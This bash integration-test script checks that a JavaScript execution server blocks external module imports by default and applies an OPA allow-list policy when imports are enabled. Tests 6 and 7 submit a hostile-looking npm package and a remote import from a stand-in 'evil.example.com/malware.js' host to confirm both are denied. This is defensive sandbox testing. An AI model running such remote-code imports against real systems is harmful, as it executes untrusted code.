#!/usr/bin/env bash
# Integration tests for module import policy enforcement via Docker Compose.
#
# Spins up:
#   mcp-default    (port 3001) – external modules DISABLED (default)
#   mcp-opa-policy (port 3002) – external modules + OPA policy enforcement
#   opa            (port 8181) – OPA server with policies/
#
# Tests:
#   1. npm import blocked on default server
#   2. jsr import blocked on default server
#   3. https URL import blocked on default server
#   4. Plain JS still works on default server
#   5. OPA-whitelisted npm package allowed (lodash-es)
#   6. Non-whitelisted npm package denied by OPA policy
#   7. Non-whitelisted URL host denied by OPA policy
#   8. Plain JS unaffected by OPA policy
#
# Prerequisites: docker compose, curl, jq

set -euo pipefail

COMPOSE_FILE="docker-compose.module-policy.yml"
DEFAULT_URL="http://localhost:3001"
OPA_URL="http://localhost:3002"
PASSED=0
FAILED=0

# ── Helpers ──────────────────────────────────────────────────────────────────

cleanup() {
  echo ""
  echo "==> Tearing down containers..."
  docker compose -f "$COMPOSE_FILE" down -v --remove-orphans 2>/dev/null || true
}
trap cleanup EXIT

fail() {
  echo "  FAIL: $1"
  FAILED=$((FAILED + 1))
}

pass() {
  echo "  PASS: $1"
  PASSED=$((PASSED + 1))
}

wait_for_ready() {
  local url="$1"
  local name="$2"
  local retries=60
  local i=0
  echo "==> Waiting for $name to be ready at $url ..."
  while [ $i -lt $retries ]; do
    if curl -sf -o /dev/null -X POST "$url/api/exec" \
         -H "Content-Type: application/json" \
         -d '{"code":"1"}' 2>/dev/null; then
      echo "  $name is ready."
      return 0
    fi
    sleep 2
    i=$((i + 1))
  done
  echo "  ERROR: $name did not become ready in time."
  echo ""
  echo "==> Container status:"
  docker compose -f "$COMPOSE_FILE" ps
  echo ""
  echo "==> Logs:"
  docker compose -f "$COMPOSE_FILE" logs
  exit 1
}

# Submit code for execution and poll until completed/failed.
# Returns the final execution JSON on stdout.
run_js() {
  local base_url="$1"
  local code="$2"
  local timeout_secs="${3:-30}"

  # Submit
  local submit_resp
  submit_resp=$(curl -sf -X POST "$base_url/api/exec" \
    -H "Content-Type: application/json" \
    -d "{\"code\": $(echo "$code" | jq -Rs .)}")

  local exec_id
  exec_id=$(echo "$submit_resp" | jq -r '.execution_id // empty')

  if [ -z "$exec_id" ]; then
    # Submission itself failed (HTTP 500)
    echo "$submit_resp"
    return 0
  fi

  # Poll until terminal state
  local elapsed=0
  while [ $elapsed -lt $timeout_secs ]; do
    sleep 1
    elapsed=$((elapsed + 1))

    local poll_resp
    poll_resp=$(curl -sf "$base_url/api/executions/$exec_id" 2>/dev/null || echo '{}')

    local status
    status=$(echo "$poll_resp" | jq -r '.status // empty')

    case "$status" in
      completed|failed|timed_out|cancelled)
        echo "$poll_resp"
        return 0
        ;;
    esac
  done

  echo '{"status":"poll_timeout","error":"Polling timed out after '"$timeout_secs"'s"}'
}

# ── Start services ───────────────────────────────────────────────────────────

echo "==> Starting docker-compose services..."
docker compose -f "$COMPOSE_FILE" up -d --build

wait_for_ready "$DEFAULT_URL" "mcp-default"
wait_for_ready "$OPA_URL" "mcp-opa-policy"

# ══════════════════════════════════════════════════════════════════════════════
# Tests on mcp-default (external modules DISABLED)
# ══════════════════════════════════════════════════════════════════════════════

echo ""
echo "==> Test 1: npm import blocked on default server"
RESULT=$(run_js "$DEFAULT_URL" 'import { camelCase } from "npm:lodash-es@4.17.21"; camelCase("hello_world");')
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
ERROR=$(echo "$RESULT" | jq -r '.error // empty')
if [ "$STATUS" = "failed" ] && echo "$ERROR" | grep -qi "external module imports are disabled"; then
  pass "npm import correctly blocked (external modules disabled)"
else
  fail "Expected npm import to be blocked, got status=$STATUS error=$ERROR"
fi

echo ""
echo "==> Test 2: jsr import blocked on default server"
RESULT=$(run_js "$DEFAULT_URL" 'import { camelCase } from "jsr:@luca/cases@1.0.0"; camelCase("hello_world");')
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
ERROR=$(echo "$RESULT" | jq -r '.error // empty')
if [ "$STATUS" = "failed" ] && echo "$ERROR" | grep -qi "external module imports are disabled"; then
  pass "jsr import correctly blocked (external modules disabled)"
else
  fail "Expected jsr import to be blocked, got status=$STATUS error=$ERROR"
fi

echo ""
echo "==> Test 3: https URL import blocked on default server"
RESULT=$(run_js "$DEFAULT_URL" 'import { camelCase } from "https://esm.sh/lodash-es@4.17.21"; camelCase("hello_world");')
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
ERROR=$(echo "$RESULT" | jq -r '.error // empty')
if [ "$STATUS" = "failed" ] && echo "$ERROR" | grep -qi "external module imports are disabled"; then
  pass "https URL import correctly blocked (external modules disabled)"
else
  fail "Expected https URL import to be blocked, got status=$STATUS error=$ERROR"
fi

echo ""
echo "==> Test 4: Plain JS works on default server"
RESULT=$(run_js "$DEFAULT_URL" '1 + 2;')
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
OUTPUT=$(echo "$RESULT" | jq -r '.result // empty')
if [ "$STATUS" = "completed" ] && [ "$OUTPUT" = "3" ]; then
  pass "Plain JS execution returned 3"
else
  fail "Expected status=completed result=3, got status=$STATUS result=$OUTPUT"
fi

# ══════════════════════════════════════════════════════════════════════════════
# Tests on mcp-opa-policy (external modules + OPA policy)
# ══════════════════════════════════════════════════════════════════════════════

echo ""
echo "==> Test 5: OPA-whitelisted npm package allowed (lodash-es)"
RESULT=$(run_js "$OPA_URL" 'import camelCase from "npm:lodash-es@4.17.21/camelCase"; console.log(camelCase("hello_world"));' 60)
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
ERROR=$(echo "$RESULT" | jq -r '.error // empty')
case "$STATUS" in
  completed)
    pass "Whitelisted npm package import succeeded"
    ;;
  failed)
    if echo "$ERROR" | grep -qi "denied by policy"; then
      fail "Whitelisted npm package should NOT be denied by policy, got: $ERROR"
    else
      # Network fetch failure is acceptable (e.g., can't reach esm.sh)
      pass "Whitelisted npm package not denied by policy (network fetch error is acceptable: $ERROR)"
    fi
    ;;
  *)
    fail "Unexpected status=$STATUS for whitelisted npm package, error=$ERROR"
    ;;
esac

echo ""
echo "==> Test 6: Non-whitelisted npm package denied by OPA policy"
RESULT=$(run_js "$OPA_URL" 'import evil from "npm:evil-package@1.0.0"; evil();')
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
ERROR=$(echo "$RESULT" | jq -r '.error // empty')
if [ "$STATUS" = "failed" ] && echo "$ERROR" | grep -qi "denied by policy"; then
  pass "Non-whitelisted npm package correctly denied by OPA policy"
else
  fail "Expected policy denial for non-whitelisted npm package, got status=$STATUS error=$ERROR"
fi

echo ""
echo "==> Test 7: Non-whitelisted URL host denied by OPA policy"
RESULT=$(run_js "$OPA_URL" 'import foo from "https://evil.example.com/malware.js"; foo();')
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
ERROR=$(echo "$RESULT" | jq -r '.error // empty')
if [ "$STATUS" = "failed" ] && echo "$ERROR" | grep -qi "denied by policy"; then
  pass "Non-whitelisted URL host correctly denied by OPA policy"
else
  fail "Expected policy denial for non-whitelisted URL host, got status=$STATUS error=$ERROR"
fi

echo ""
echo "==> Test 8: Plain JS unaffected by OPA policy"
RESULT=$(run_js "$OPA_URL" '1 + 2;')
STATUS=$(echo "$RESULT" | jq -r '.status // empty')
OUTPUT=$(echo "$RESULT" | jq -r '.result // empty')
if [ "$STATUS" = "completed" ] && [ "$OUTPUT" = "3" ]; then
  pass "Plain JS execution returned 3 (OPA policy server)"
else
  fail "Expected status=completed result=3 on OPA server, got status=$STATUS result=$OUTPUT"
fi

# ── Summary ──────────────────────────────────────────────────────────────────

echo ""
echo "=============================="
echo "Results: $PASSED passed, $FAILED failed"
echo "=============================="

if [ "$FAILED" -gt 0 ]; then
  exit 1
fi
